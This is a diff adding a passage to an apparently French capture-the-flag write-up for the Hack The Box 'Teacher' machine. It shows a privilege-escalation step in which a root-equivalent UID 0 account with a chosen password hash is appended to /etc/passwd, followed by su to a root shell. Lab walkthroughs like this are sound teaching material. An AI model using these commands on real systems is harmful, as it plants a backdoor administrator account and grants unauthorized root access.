@@ -230,4 +230,20 @@ Dans ce cas il y'a rien de bien compliqué nous allons simplement supprimerl les
 
 [![forthebadge made-with-python](https://i.giphy.com/media/l4HodBpDmoMA5p9bG/giphy.webp)](https://i.giphy.com/media/l4HodBpDmoMA5p9bG/giphy.webp)
 
+Je créer un mot de passe avec mkpasswd pour mettre cela dans le fichier passwd.
+
+    root@Seyptoo:~/htb/writeup/Teacher# mkpasswd -m sha-512 seyptoo
+    $6$4.FCX0BzdmJd77$HWgUSNGZsazwyv1ZMUVIP1u6R8wsPwTk20xOp0kRHd2T2EELmaIlxO9aloi0QtxBnfFjMlLehMDccVjd5yN00
+
+    giovanni@teacher:/etc$ echo -e 'seyptoo:$6$4.FCX0BzdmJd77$HWgUSNGZsazwyv1ZMUVIP1u6R8wsPwTk20xOp0kRHd2T2EELmaIlxO9aloi0QtxBnfFjMlLehMDccVjd5yN00.:0:0:root:/root:/bin/bash ' >> /etc/passwd
+
+    giovanni@teacher:/etc$ cat passwd
+    root:x:0:0:root:/root:/bin/bash             seyptoo:$6$4.FCX0BzdmJd77$HWgUSNGZsazwyv1ZMUVIP1u6R8wsPwTk20xOp0kRHd2T2EELmaIlxO9aloi0QtxBnfFjMlLehMDccVjd5yN00.:0:0:root:/root:/bin/bash
+
+    giovanni@teacher:/etc$ su - seyptoo
+    su - seyptoo
+    Password: seyptoo
+
+    root@teacher:~#
+
 N'hésitez pas à star ma répositorie c'étais une boîte très intéréssante, ou il y'avais beaucoup d'énumération.
